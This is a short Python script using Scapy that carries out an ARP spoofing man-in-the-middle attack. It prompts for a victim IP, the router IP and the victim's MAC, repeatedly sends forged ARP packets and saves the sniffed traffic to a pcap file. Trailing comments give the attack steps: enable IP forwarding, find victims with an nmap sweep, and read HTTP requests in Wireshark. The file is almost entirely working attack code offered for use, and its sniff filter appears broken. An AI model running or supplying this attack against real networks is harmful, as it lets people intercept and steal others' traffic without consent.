#!/usr/bin/env python

from scapy.all import * 
from subprocess import call
import time
import sys
#import pyshark

op=1 #op code 1 for ARP request
victim=raw_input("Enter the target ip : ")
victim=victim.replace(" ","")

spoof=raw_input("Enter the routers/spoof ip address : ")
spoof=spoof.replace(" ","")

mac=raw_input("Enter the target mac : ")
mac=mac.replace("-",":")
mac=mac.replace(" ","")

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

#wrpcap("packets.pcap", pkts) #pyshark

def write(pkt):
	wrpcap('Filter.pcap',pkt,append=True)
def querysniff(pkt):
	write(pkt)
	print pkt.summary()


while 1:
	send(arp)
	try:
		sniff(iface = 'eth0', filter = "victim", prn=querysniff, store = 1)
	except Exception: 
		pass
	#cap=pyshark.LiveCapture(output_file="capture.pcap")	#pyshark live capture
	#cap.sniff(timeout=60) #set timeout




#cap

#import pyshark


#victime ubuntu vm

#ip:192.168.0.104
#mac:00:0c:29:17:c4:26
#router/getaway:192.168.0.1


#instruction	
#set ip_forward to 1 : /proc/sys/net/ipv4/ip_forwar
#mac and ip of victim: sudo nmap -sP {Route ip ending with zero}/cidr value(24)for netmask 255.255.255.0
#perform attack
#open wireshark
#filter ip and open http website to check this, ip.addr=ip and http.request,filter traffice


